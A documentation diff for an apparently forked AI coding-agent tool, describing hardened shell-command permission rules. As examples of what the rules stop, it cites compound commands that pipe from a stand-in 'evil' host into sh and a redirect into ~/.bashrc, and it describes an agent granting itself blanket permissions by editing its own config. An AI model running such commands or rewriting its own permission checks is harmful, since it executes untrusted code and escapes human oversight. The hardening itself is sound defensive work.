@@ -134,12 +134,34 @@ The fork hardens the shell-command permission model relative to upstream
   with `restricted = false` in `~/.forge/.forge.toml`.
 - **Commands and URL fetches confirm by default.** The default policy file
   (`crates/forge_services/src/permissions.default.yaml`, materialised as
-  `permissions.yaml` on first use) maps `command: "*"` and `url: "*"` to
-  `confirm` instead of upstream's `allow`. Reads and writes stay
-  allow-all. An existing `permissions.yaml` is never rewritten, so
-  installs that predate this change keep their old (allow-all) file until
-  it is deleted or edited.
+  `permissions.yaml` on first use) drops upstream's blanket
+  `allow`/`command: "*"` and `allow`/`url: "*"` rules; reads and writes stay
+  allow-all. Confirmation comes from the *absence* of a rule, because
+  `PolicyEngine` already defaults to `Confirm` when nothing matches. A
+  `confirm`/`command: "*"` catch-all would be worse than useless: the engine
+  returns the first matching `Deny`/`Confirm` and discards any `Allow` it has
+  already seen, so the catch-all would shadow every allow rule — including
+  the ones "Accept and Remember" writes — and re-prompt forever. An existing
+  `permissions.yaml` is never rewritten, so installs that predate this change
+  keep their old (allow-all) file until it is deleted or edited.
+- **Forge cannot rewrite its own permissions.** The default policy denies
+  writes to `permissions.yaml`, `.forge.toml` and anything under a `forge` /
+  `.forge` directory. Without that, the write allow-all would let an agent
+  grant itself blanket command permissions — or set `restricted = false` —
+  with the ordinary write tool and never prompt. `Deny` wins over `Allow` in
+  the engine, so these rules survive the allow-all that follows them.
 - **"Accept and Remember" stores exact commands.** Remembering an accepted
   command writes a glob-escaped exact-match execute rule instead of the
   upstream `<cmd> <subcmd>*` prefix glob, which also matched compound
   commands such as `git push; curl evil | sh`.
+- **Execute rules are matched per simple command.** Commands are parsed with
+  `tree-sitter-bash` (`crates/forge_services/src/command_extract.rs`) and each
+  simple command — including those inside pipelines, `&&`/`;` lists,
+  subshells and `$()` substitutions — is matched separately, so `git *` no
+  longer auto-allows `git status && curl evil | sh`. Redirections stay
+  attached to the statement they belong to (`cargo test > ~/.bashrc` is not
+  reduced to `cargo test`), and anything the parser cannot model safely —
+  syntax errors, standalone assignments, `export`/`declare`/`unset` — falls
+  back to `Confirm` rather than being auto-allowed. On Windows, where
+  commands run through `cmd.exe` rather than a POSIX shell, the raw-string
+  verdict is kept because the bash grammar does not describe that syntax.
